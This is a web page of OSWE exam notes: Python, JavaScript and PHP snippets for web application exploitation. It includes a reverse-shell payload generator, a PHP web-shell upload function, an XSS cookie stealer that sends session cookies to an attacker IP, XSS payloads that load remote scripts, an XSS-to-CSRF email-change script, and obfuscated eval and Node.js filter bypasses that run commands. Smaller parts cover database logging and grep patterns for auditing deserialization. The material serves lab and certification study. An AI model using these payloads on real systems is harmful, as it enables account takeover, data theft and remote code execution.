---
layout: python-code-snippets
title: Python Code Snippets
permalink: /python-code-snippets/
---

<!-- OSWE Reference (HTML) - paste into your .md file -->
<link href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism-tomorrow.min.css" rel="stylesheet" />
<script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/components/prism-python.min.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/components/prism-javascript.min.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/components/prism-php.min.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/components/prism-java.min.js"></script>

<style>
  /* klisé-inspired variables (dark theme). Tweak these to match the theme precisely */
  :root{
    --bg: #0a0a0a;
    --panel: #151515;
    --muted: #a1a1a1;
    --text: #d4d4d4;
    --accent: #c71585;
    --accent-2: #ffffff;
    --code-bg: #050505;
    --border: rgba(255,255,255,0.2);
  }

  /* Container and typography */
  .oswe-container{
    background: var(--bg);
    color: var(--text);
    font-family: Inter, -apple-system, "Segoe UI", Roboto, "Helvetica Neue", Arial;
    padding: 28px;
    line-height: 1.6;
    border-radius: 8px;
    box-shadow: 0 6px 24px rgba(2,6,23,0.6);
  }

  .oswe-title{
    color: var(--accent);
    margin: 0 0 8px 0;
    font-size: 1.9rem;
    letter-spacing: -0.5px;
  }

  .oswe-subtitle{
    color: var(--muted);
    margin: 0 0 18px 0;
    font-size: 0.95rem;
  }

  /* TOC */
  .oswe-toc{
    background: linear-gradient(180deg, rgba(255,255,255,0.01), rgba(255,255,255,0.0));
    border: 1px solid var(--border);
    padding: 14px;
    border-radius: 8px;
    margin-bottom: 18px;
  }
  .oswe-toc a{ color: var(--accent); text-decoration: none; }
  .oswe-toc a:hover{ text-decoration: underline; }

  /* Headings */
  h1, h2, h3, h4 {
    color: var(--accent-2);
    margin-top: 20px;
  }
  h1 { font-size: 1.6rem; }
  h2 { font-size: 1.25rem; }
  h3 { font-size: 1.05rem; color: var(--accent); }

  /* Paragraphs & lists */
  p, li, pre, code { color: var(--text); }
  code.inline { background: rgba(255,255,255,0.03); padding: 2px 6px; border-radius: 4px; font-family: ui-monospace, SFMono-Regular, Menlo, Monaco, "Roboto Mono", "Courier New", monospace; font-size: .95em; }
  ul { margin-left: 1.1rem; }
  ul > li { list-style-type: none; }
  ul > li::before { content: ""; }

  /* Panels */
  .panel {
    background: var(--panel);
    border: 1px solid var(--border);
    padding: 12px;
    border-radius: 8px;
    margin: 10px 0;
  }

  /* Code blocks (Prism theme file included above) */
  pre[class*="language-"] {
    background: var(--code-bg) !important;
    border-radius: 8px;
    padding: 14px;
    overflow: auto;
    margin: 14px 0;
    border: 1px solid var(--border);
    box-shadow: inset 0 -10px 50px rgba(0,0,0,0.6);
    font-size: 0.95rem;
  }
  /* Make code fonts a little larger for readability */
  pre code { font-family: "Fira Code", "JetBrains Mono", ui-monospace, SFMono-Regular, Menlo, Monaco, monospace; }

  /* small helper styles */
  .muted { color: var(--muted); font-size: .95rem; }
  .kbd { background:#0c1723; border:1px solid var(--border); padding:3px 6px; border-radius:6px; font-family: ui-monospace; color:var(--accent); }
  a { color: var(--accent); }

  /* Layout styles */
  .oswe-main {
    display: flex;
    gap: 20px;
  }
  .oswe-toc {
    flex: 0 0 250px;
    position: sticky;
    top: 20px;
    height: fit-content;
  }
  .oswe-content {
    flex: 1;
  }
  .content-section {
    display: none;
  }
</style>

<div class="oswe-container">
  <h1 class="oswe-title">OSWE</h1>
  <p class="oswe-subtitle">Notes & snippets</p>

  <div class="oswe-main">
    <div class="oswe-toc panel">
      <strong>Contents</strong>
      <ol>
        <li><a href="#Concepts">Concepts</a></li>
        <li><a href="#Enable-Database-Debug-and-Logging">Enable Database Debug and Logging</a>
          <ul>
            <li><a href="#Postgres">Postgres</a></li>
            <li><a href="#MySQL">MySQL</a></li>
          </ul>
        </li>
        <li><a href="#Python-Code-Snippets">Python Code Snippets</a>
          <ul>
            <li><a href="#Starting-Template">Starting Template</a></li>
            <li><a href="#File-Upload">File Upload</a></li>
            <li><a href="#HTTP-File-Server">HTTP File Server</a></li>
          </ul>
        </li>
        <li><a href="#XSS-Payloads">XSS Payloads</a>
          <ul>
            <li><a href="#Payload-1">Payload 1</a></li>
            <li><a href="#Payload-2">Payload 2</a></li>
            <li><a href="#XSS-Cookies-Stealer">XSS Cookies Stealer</a></li>
            <li><a href="#Leverage-XSS-to-CSRF">Leverage XSS to CSRF</a></li>
          </ul>
        </li>
        <li><a href="#Java-Code-Snippets">Java Code Snippets</a></li>
        <li><a href="#Java-Insecure-Deserialization">Java Insecure Deserialization</a></li>
        <li><a href="#Regex-Cheetsheet">Regex Cheetsheet</a></li>
        <li><a href="#Bypass-PHP-Eval-Filtering">Bypass PHP Eval Filtering</a></li>
        <li><a href="#Bypass-Javascript-Injection-Filters">Bypass Javascript Injection Filters</a></li>
        <li><a href="#YSOSerial-Payload-Creation">YSOSerial</a></li>
        <li><a href="#Report-Recommendations">Report Recommedations</a></li>
        <li><a href="#Additional-Resources">Additional Resources</a></li>
      </ol>
    </div>

    <div class="oswe-content">
      <!-- CONTENT -->
      <div class="content-section" id="section-Concepts">
        <h2 id="Concepts">Concepts</h2>

        <h3>Authentication Bypass:</h3>
        <div class="panel">
          <p class="muted">Common techniques:</p>
          <ul>
            <li>SQLi, XSS, Type Juggling, Application Logic Flaws, CORS, CSRF vb.</li>
          </ul>
        </div>

        <h3>Remote Code Execution:</h3>
        <div class="panel">
          <p class="muted">Common techniques:</p>
          <ul>
            <li>SQLi, Javascript Injection, File upload, Deserialization, SSTI, Prototype Pollution, SSRF.</li>
          </ul>
        </div>
      </div>

      <div class="content-section" id="section-Enable-Database-Debug-and-Logging">
        <h2 id="Enable-Database-Debug-and-Logging">Enable Database Debug and Logging</h2>

        <h3 id="Postgres">Postgres</h3>
        <p>Edit your <code class="inline">/etc/postgresql/&lt;version-num&gt;/main/postgresql.conf</code>, and change the lines as follows.</p>
        <p class="muted">Note: If you didn't find the postgresql.conf file, then just type <code class="kbd">$locate postgresql.conf</code> in a terminal</p>

        <p>Uncomment these fields:</p>
        <div class="panel">
          <ol>
            <li><code class="inline">#log_directory = 'log'</code></li>
            <li><code class="inline">#log_filename = 'postgresql-%Y-%m-%d_%H%M%S.log'</code></li>
          </ol>
        </div>

        <p>Change these fields values:</p>
        <div class="panel">
          <ol>
            <li><code class="inline">#log_statement = 'none'</code> → <code class="inline">log_statement = 'all'</code></li>
            <li><code class="inline">#logging_collector = off</code> → <code class="inline">logging_collector = on</code></li>
            <li>Restart: <code class="kbd">sudo /etc/init.d/postgresql restart</code> or <code class="kbd">sudo service postgresql restart</code></li>
            <li>Fire query in postgresql: <code class="inline">select 2+2</code>.</li>
            <li>Find current log in <code class="inline">/var/lib/postgresql/10/main/log</code></li>
          </ol>
        </div>

        <h3 id="MySQL">MySQL</h3>
        <p>Login to the MySQL instance and check out the <code class="inline">general_log</code> and values, whether it is set to ON or OFF:</p>
        <div class="panel">
          <pre><code class="language-sql">show variables like '%log%';</code></pre>
        </div>

        <p>If it's OFF, run as root:</p>
        <div class="panel">
          <pre><code class="language-sql">SET GLOBAL general_log = 1;</code></pre>
        </div>

        <p>Then check <code class="inline">general_log_file</code> to find where logs are written.</p>
      </div>

      <div class="content-section" id="section-Python-Code-Snippets">
        <h2 id="Python-Code-Snippets">Python Code Snippets</h2>

        <h3 id="Starting-Template">Starting Template</h3>
        <div class="panel">
          <pre><code class="language-python">import requests
import string
import re
import threading
import base64
import netifaces
import random
from concurrent.futures import ThreadPoolExecutor, as_completed
from http.server import BaseHTTPRequestHandler
from http.server import HTTPServer

GREEN = '\033[92m'   # Bright Green
RED = '\033[91m'     # Bright Red
RESET = '\033[0m'    # Reset to default color

# Define reusable symbols

success = f"{GREEN}[+]{RESET}"
failure = f"{RED}[-]{RESET}"

proxies = {"http":"http://127.0.0.1:8080"}

def generate_b64revshell(listener_ip, listener_port):

    payload = f"bash -i >& /dev/tcp/{listener_ip}/{listener_port} 0>&1"
    payload_bytes = payload.encode('ascii')
    b64payload = base64.b64encode(payload_bytes)
    base64_payload = b64payload.decode('ascii')
    return base64_payload

def register():

    ## Register logic

def login():

    ## Login Logic

if __name__ == "__main__":

    # Parsers

    parser = argparse.ArgumentParser(description="Full chain to RCE in Answers Application")
    parser.add_argument('--target-ip', type=str, required=True, help="Specify the target IP Address.")
    parser.add_argument('--listener-ip', type=str, required=True, help="Specify the listener IP Address.")
    parser.add_argument('--listener-port', type=str, required=True, help="Specify the listener IP Address.")   
    args = parser.parse_args()

    target_ip = args.target_ip
    listener_ip = args.listener_ip
    listener_port = args.listener_port

    # Main Logic

    username, password = register()
    usercookies = login(username, password) </code></pre>
        </div>

        <hr />

        <h3 id="File-Upload">File Upload With Additional Parameters</h3>
        <div class="panel">
          <pre><code class="language-python">def uploadFile(phpsessid):

    url = "http://10.100.102.73:80/item/updateItem.php"

    payload_content = b"<?php system($_REQUEST['cmd']); ?>"
    pwny = io.BytesIO(payload_content)

    data = {
        "id": "1",
        "id_user": "1",
        "name": "Raspery Pi 4",
        "description": ("Latest Raspberry Pi 4 Model B with 2/4/8GB RAM raspberry pi 4 "
                        "BCM2711 Quad core Cortex-A72 ARM v8 1.5GHz Speeder Than Pi 3B"),
        "price": "92"
    }

    filename = ''.join(random.choices(string.ascii_letters + string.digits, k=4)) + '.phar'
    files = {
        "image": (filename, pwny, "application/octet-stream")
    }
    
    cookies = {

        "PHPSESSID": phpsessid
    }

    r = requests.post(url, data=data, files=files, cookies=cookies, proxies=proxies, allow_redirects=False)
    loginheader = r.headers.get("Location", "")
    match = re.search(r'index\.php$', loginheader)
    if match:
        print(f"[+] Filename {filename} uploaded successfully!")
    else:
        print("[-] File is not uploaded.")
    return filename</code></pre>
        </div>

        <hr />

        <h3 id="HTTP-File-Server">HTTP File Server 1</h3>
        <div class="panel">
          <pre><code class="language-python">from http.server import BaseHTTPRequestHandler
from http.server import HTTPServer

LHOST      = "10.0.0.1"
WEB_PORT   = 8000
JS_PAYLOAD = "&lt;script&gt;alert(1)&lt;/script&gt;"

def start_web_server():
    class MyHandler(BaseHTTPRequestHandler):
        # Uncomment this method to suppress HTTP logs
        # def log_message(self, format, *args):
        #     return

        def do_GET(self):
            if self.path.endswith('/payload.js'):
                self.send_response(200)
                self.send_header("Content-Type", "application/javascript")
                self.send_header("Content-Length", str(len(JS_PAYLOAD)))
                self.end_headers()
                self.wfile.write(JS_PAYLOAD.encode())
            
    httpd = HTTPServer((LHOST, WEB_PORT), MyHandler)
    threading.Thread(target=httpd.serve_forever).start()

start_web_server()</code></pre>
        </div>

        <h4>HTTP File Server 2</h4>
        <div class="panel">
          <pre><code class="language-python">from http.server import BaseHTTPRequestHandler, HTTPServer
import threading
import os

def start_web_server(host="192.168.45.249", port=80, directory="."):
    os.chdir(directory)
    
    class MyHandler(BaseHTTPRequestHandler):
        def do_GET(self):
            try:
                file_path = os.path.join(directory, self.path.lstrip("/"))
                if os.path.exists(file_path) and os.path.isfile(file_path):
                    self.send_response(200)
                    if file_path.endswith(".dtd"):
                        self.send_header("Content-type", "application/xml-dtd")
                    else:
                        self.send_header("Content-type", "text/plain")
                    self.end_headers()
                    with open(file_path, "rb") as f:
                        self.wfile.write(f.read())
                else:
                    self.send_response(404)
                    self.send_header("Content-type", "text/plain")
                    self.end_headers()
                    self.wfile.write(b"File not found")
            except Exception as e:
                self.send_response(500)
                self.send_header("Content-type", "text/plain")
                self.end_headers()
                self.wfile.write(f"Server error: {str(e)}".encode())

    httpd = HTTPServer((host, port), MyHandler)
    print(f"{success} Serving at {host}:{port}")
    threading.Thread(target=httpd.serve_forever, daemon=True).start()
    return httpd</code></pre>
        </div>

        <h4>HTTP File Server 3</h4>
        <div class="panel">
          <pre><code class="language-python">import threading
import mimetypes

HOST = '0.0.0.0'
PORT = 8000
SERVE_DIR = '.'

def handle_client(conn, addr):
    print(f"{success} Connection from {addr}")
    try:
        # Receive request data
        request = conn.recv(1024).decode('utf-8')
        # print(f"Received request from {addr}: {request[:100]}...")  # Log first 100 chars        
        # Simple parsing: Extract the path from "GET /path HTTP/1.1"
        lines = request.split('\n')
        if lines and 'GET /' in lines[0]:
            path = lines[0].split(' ')[1]  # e.g., "/filename.txt"
            if path == '/':
                path = '/index.html'  # Optional: Default to index.html if root, but you can remove this
            full_path = os.path.join(SERVE_DIR, path.lstrip('/'))
            
            if os.path.exists(full_path) and os.path.isfile(full_path):
                # Read and send the file
                with open(full_path, 'rb') as f:
                    file_data = f.read()
                
                # Guess MIME type
                mime_type, _ = mimetypes.guess_type(full_path)
                if mime_type is None:
                    mime_type = 'application/octet-stream'
                
                # Basic HTTP response
                response = (
                    b'HTTP/1.1 200 OK\r\n'
                    b'Content-Type: ' + mime_type.encode('utf-8') + b'\r\n'
                    b'Content-Length: ' + str(len(file_data)).encode('utf-8') + b'\r\n'
                    b'\r\n'
                )
                conn.sendall(response + file_data)
                print(f"Served {full_path} ({len(file_data)} bytes) to {addr}")
            else:
                # 404 response
                response = b'HTTP/1.1 404 Not Found\r\nContent-Type: text/plain\r\n\r\nFile not found.'
                conn.sendall(response)
                print(f"File {full_path} not found for {addr}")
        else:
            # 400 for invalid request
            response = b'HTTP/1.1 400 Bad Request\r\nContent-Type: text/plain\r\n\r\nInvalid request.'
            conn.sendall(response)
    except Exception as e:
        print(f"Error handling {addr}: {e}")
    finally:
        conn.close()

def server():
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)  # Allow reuse of address
        s.bind((HOST, PORT))
        s.listen(5)  # Backlog of 5 for queued connections
        print(f"{success}Background file server listening on {HOST}:{PORT} ... (serving from {SERVE_DIR})")
        while True:
            conn, addr = s.accept()
            # Handle each client in a separate thread for concurrency
            client_thread = threading.Thread(target=handle_client, args=(conn, addr))
            client_thread.start()

# Start the server in a background thread (daemon=True so it exits when main does)
server_thread = threading.Thread(target=server, daemon=True)
server_thread.start()

# Main program continues here (non-blocking)
print(f"{success} File server started in background. Main program running...")</code></pre>
        </div>

        <h3 id="XSS-Cookies-Stealer">XSS Cookies Stealer</h3>
        <div class="panel">
          <pre><code class="language-python">def send_xss_payload():

    payload = "&lt;script&gt;document.location='http://10.100.102.67:9001/?c='+document.cookie&lt;/script&gt;"
    data = {
        'title': 'test',
        'author': 'blabla',
        'text': payload,
        'submit': 'Submit'
    }

    proxies = {"http": "http://127.0.0.1:8080"}  # Use Burp or comment this out
    try:
        r = requests.post(TARGET_URL, data=data, proxies=proxies)
        if r.status_code == 200:
            print("XSS payload sent successfully.")
        else:
            print(f"Server responded with status code: {r.status_code}")
    except Exception as e:
        print(f"Error sending payload: {e}")

def listen_for_cookies():

    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.bind((HOST, PORT))
        s.listen(1)
        print(f"Listening on {HOST}:{PORT} ...")
        print("Waiting for admin to trigger XSS...")

        conn, addr = s.accept()
        with conn:
            print(f"Connection from {addr}")
            data = conn.recv(2048)

            # Base64 encode for logging
            encoded_data = base64.b64encode(data).decode('utf-8')
            print(f"Base64 Encoded Request: " + encoded_data)

            decoded_data = data.decode('utf-8', errors='ignore')

            # Extract cookie
            match = re.search(r'PHPSESSID=([^;& ]+)', decoded_data)
            if match:
                cookie = match.group(1)
                print(f"PHPSESSID captured: " + cookie)
                return cookie
            else:
                print("PHPSESSID not found in received data.")

send_xss_payload()
listen_for_cookies()</code></pre>
        </div>

        <hr />
      </div>

      <div class="content-section" id="section-Java-Insecure-Deserialization">
        <h2 id="Java-Insecure-Deserialization">Java Insecure Deserialization</h2>

        <h3 id="Methods-and-Classes">Methods and Classes</h3>
        <div class="panel">
          <ul>
            <li><code>ObjectInputStream.readObject()</code> Primary method for deserializing objects in Java.</li>
            <li><code>ObjectInputStream.readUnshared()</code></li>
            <li><code>ObjectInputStream.readResolve()</code></li>
            <li><code>ObjectInputStream.defaultReadObject()</code></li>
            <li><code>XMLDecoder.readObject()</code></li>
            <li><code>XStream.fromXML()</code></li>
            <li><code>ObjectMapper.readValue()</code> (Jackson)</li>
            <li><code>Kryo.readObject()</code> (Kryo)</li>
            <li><code>SnakeYAML.load()</code></li>
          </ul>
        </div>

        <h3 id="Identify-Insecure-Deserialization-in-Source-Code">Identify Insecure Deserialization in Source Code</h3>

        <p>When auditing source code, follow these steps to identify potential insecure deserialization vulnerabilities:</p>

        <h4 id="Search-for-Deserialization-Methods">Search for Deserialization Methods</h4>
        <p>Use code analysis tools (grep, IDE search, SonarQube) to find calls to the methods listed above.</p>
        <div class="panel">
          <pre><code class="language-bash">grep -r "readObject" .
grep -r "XStream\.fromXML" .
grep -r --include="*.java" -E '(ObjectInputStream\.readObject\(|ObjectInputStream\.readUnshared\(|readResolve\(|defaultReadObject\(|XMLDecoder|XStream\.fromXML\(|ObjectMapper\.readValue\(|Kryo\.readObject\(|Kryo\.readClassAndObject\(|Yaml\.load\(|HessianInput\.readObject\()' .</code></pre>
        </div>

        <h4 id="Trace-Input-Sources">Trace Input Sources</h4>
        <p>Trace inputs to see if untrusted (network, file upload, request params) data flows into deserialization APIs.</p>

        <h4 id="Check-for-Validation-or-Whitelisting">Check for Validation or Whitelisting</h4>
        <p>Look for <code>ObjectInputFilter</code> or similar filters. Example:</p>
        <div class="panel">
          <pre><code class="language-java">ObjectInputFilter filter = ObjectInputFilter.Config.createFilter("allowed.package.*;!*");
ObjectInputStream ois = new ObjectInputStream(input);
ois.setObjectInputFilter(filter);</code></pre>
        </div>

        <h4 id="Inspect-Serializable-Classes">Inspect Serializable Classes</h4>
        <p>Find classes implementing <code>Serializable</code> or <code>Externalizable</code> and inspect special read/write hooks.</p>
      </div>

      <div class="content-section" id="section-Regex-Cheetsheet">
        <h2 id="Regex-Cheetsheet">Regex Cheetsheet</h2>
        <p>Match a START and END delimeter in <code>r.text</code>:</p>
        <div class="panel">
          <pre><code class="language-python">r = requests.post(target, headers=headers, data=xml, proxies=proxies)
match = re.search(f'{re.escape("START DELIMETER")}(.*?){re.escape("END DELIMETER")}', r.text, re.DOTALL)
print(match[1].strip())</code></pre>
        </div>

        <p>Extract a cookie value from response headers:</p>
        <div class="panel">
          <pre><code class="language-python">r = requests.post(target, headers=headers, data=xml, proxies=proxies)
set_cookie = r.headers.get('Set-Cookie', '')
match = re.search(r'JSESSIONID=([A-Za-z0-9]+);', set_cookie)
print(match.group(1))</code></pre>
        </div>
      </div>

      <div class="content-section" id="section-XSS-Payloads">
        <h2 id="XSS-Payloads">XSS Payloads</h2>

        <h3 id="Payload-1">Load External JavaScript</h3>
        <div class="panel">
          <ul>
            <li><code>&lt;img src="invalid-image" onerror="var script = document.createElement('script'); script.src='http://192.168.118.2/malicious.js'; document.body.appendChild(script);" /&gt;</code></li>
            <li><code>&lt;img src=x onerror=eval(atob("&lt;BASE64 JAVASCRIPT PAYLOAD&gt;"))&gt;</code></li>
            <li><code>&lt;audio onloadstart="var s=document.createElement('script');s.src='//192.168.45.163/worked.js';document.head.appendChild(s)"&gt;&lt;source&gt;&lt;/audio&gt;</code></li>
            <li><code>&lt;iframe/srcdoc="&lt;script/src=//192.168.45.163/worked.js&gt;&lt;/script&gt;"&gt;</code></li>
            <li><code>&lt;strong onafterscriptexecute=""&gt;&lt;script src="http://192.168.45.163/worked.js"&gt;&lt;/script&gt;&lt;/strong&gt;</code></li>
          </ul>
        </div>

        <h3 id="Payload-2">Load Inline JavaScript</h3>
        <div class="panel">
          <ul>
            <li><code>&lt;audio onloadstart="setTimeout(atob('YWxlcnQoIlhTUyIp'))"&gt;&lt;source&gt;&lt;/audio&gt;</code></li>
            <li><code>&lt;audio src=x onerror=Function(atob('YWxlcnQoIlhTUyIp'))()&gt;&lt;/audio&gt;</code></li>
            <li><code>&lt;audio onloadstart="Function(atob('YWxlcnQoIlhTUyIp'))()"&gt;&lt;source&gt;&lt;/audio&gt;</code></li>
            <li><code>&lt;video src=x onerror=eval(atob('YWxlcnQoIlhTUyIp'))&gt;&lt;/video&gt;</code></li>
          </ul>
        </div>

        <h3 id="Leverage-XSS-to-CSRF">Leverage XSS to CSRF</h3>
        <div class="panel">
          <pre><code class="language-javascript">var req = new XMLHttpRequest();
req.onload = handleResponse;
req.open('get','/my-account',true);
req.send();
function handleResponse() {
    var token = this.responseText.match(/name="csrf" value="(\w+)"/)[1];
    var changeReq = new XMLHttpRequest();
    changeReq.open('post', '/my-account/change-email', true);
    changeReq.send('csrf='+token+'&email=test@test.com')
};</code></pre>
        </div>

        <h3 id="XSS-Cookies-Stealer-js">Filter cookie & send</h3>
        <div class="panel">
          <pre><code class="language-javascript">function getCookieValue(name) {
    const cookieString = document.cookie;
    const cookies = cookieString.split('; ');
    for (let cookie of cookies) {
        const [key, value] = cookie.split('=');
        if (key === name) return value;
    }
    return null;
}
const cookieName = 'token';
const cookieValue = getCookieValue(cookieName);

var req2 = new XMLHttpRequest();
req2.open('GET', 'http://192.168.45.163/' + (cookieValue || ''), false);
req2.send();</code></pre>
        </div>
      </div>

      <div class="content-section" id="section-Java-Code-Snippets">
        <h2 id="Java-Code-Snippets">Java Code Snippets</h2>
      </div>

      <div class="content-section" id="section-Bypass-PHP-Eval-Filtering">
        <h2 id="Bypass-PHP-Eval-Filtering">Bypass PHP Eval Filtering</h2>
        <div class="panel">
          <pre><code class="language-php">get_defined_functions()['internal'][array_search(urldecode("%65%78%65%63"), get_defined_functions()['internal'])]("whoami");
(new ReflectionFunction(hex2bin("65786563")))->invoke('hostname');</code></pre>
        </div>
      </div>

      <div class="content-section" id="section-Bypass-Javascript-Injection-Filters">
        <h2 id="Bypass-Javascript-Injection-Filters">Bypass Javascript Injection Filters</h2>
        <div class="panel">
          <pre><code class="language-javascript">(function(){module.constructor._load(Buffer.from('6368696c645f70726f63657373','hex').toString()).execSync('ping -c 2');})(); //" 
(function(){module.constructor._load(String.fromCharCode(99,104,105,108,100,95,112,114,111,99,101,115,115)).execSync('ping -c 2');})();//"</code></pre>
        </div>
      </div>

      <div class="content-section" id="section-YSOSerial-Payload-Creation">
        <h2 id="YSOSerial-Payload-Creation">YSOSerial</h2>
        <h3 id="NET-Version">.NET Version</h3>
        <p><a href="https://github.com/pwntester/ysoserial.net">https://github.com/pwntester/ysoserial.net</a></p>

        <h3 id="JAVA-Version">JAVA Version</h3>
        <p><a href="https://github.com/frohoff/ysoserial">https://github.com/frohoff/ysoserial</a></p>
      </div>

      <div class="content-section" id="section-Report-Recommendations">
        <h2 id="Report-Recommendations">Report Recommedations</h2>
        <p>For code indentation:</p>
        <ul>
          <li>Copy the code straight from VS Code into a 1x1 table in Word</li>
        </ul>
      </div>

      <div class="content-section" id="section-Additional-Resources">
        <h2 id="Additional-Resources">Additional Resources</h2>
        <p>Further practice & references:</p>
        <ul>
          <li><a href="https://github.com/yeswehack/vulnerable-code-snippets">https://github.com/yeswehack/vulnerable-code-snippets</a></li>
          <li><a href="https://github.com/bmdyy/order">https://github.com/bmdyy/order</a></li>
          <li><a href="https://github.com/bmdyy/chat.js">https://github.com/bmdyy/chat.js</a></li>
          <li><a href="https://github.com/bmdyy/tudo">https://github.com/bmdyy/tudo</a></li>
          <li><a href="https://github.com/bmdyy/testr">https://github.com/bmdyy/testr</a></li>
          <li><a href="https://github.com/TROUBLE-1/White-box-pentesting">https://github.com/TROUBLE-1/White-box-pentesting</a></li>
          <li><a href="https://www.vulnhub.com/entry/securecode-1,651">https://www.vulnhub.com/entry/securecode-1,651</a></li>
          <li><a href="https://github.com/takito1812/web-hacking-playground">https://github.com/takito1812/web-hacking-playground</a></li>
          <li><a href="https://pentesterlab.com/badges/codereview">https://pentesterlab.com/badges/codereview (paid)</a></li>
          <li><a href="https://github.com/b1d0ws/OSWE">https://github.com/b1d0ws/OSWE</a></li>
          <li><a href="https://regexlearn.com/learn/">https://regexlearn.com/learn/</a></li>
          <li><a href="https://www.nomachine.com/">https://www.nomachine.com/</a></li>
        </ul>
      </div>

      <p class="muted">— end of document —</p>
    </div>
  </div>
</div>

<script>
document.addEventListener('DOMContentLoaded', function() {
  document.querySelectorAll('.content-section').forEach(sec => sec.style.display = 'none');
  const firstSection = document.querySelector('.content-section');
  if (firstSection) firstSection.style.display = 'block';

  document.querySelectorAll('.oswe-toc a').forEach(link => {
    link.addEventListener('click', function(e) {
      e.preventDefault();
      const targetId = this.getAttribute('href');
      const targetElement = document.querySelector(targetId);
      if (targetElement) {
        const section = targetElement.closest('.content-section');
        if (section) {
          document.querySelectorAll('.content-section').forEach(sec => sec.style.display = 'none');
          section.style.display = 'block';
          setTimeout(() => {
            targetElement.scrollIntoView({ behavior: 'smooth' });
          }, 100);
        }
      }
    });
  });
});
</script>
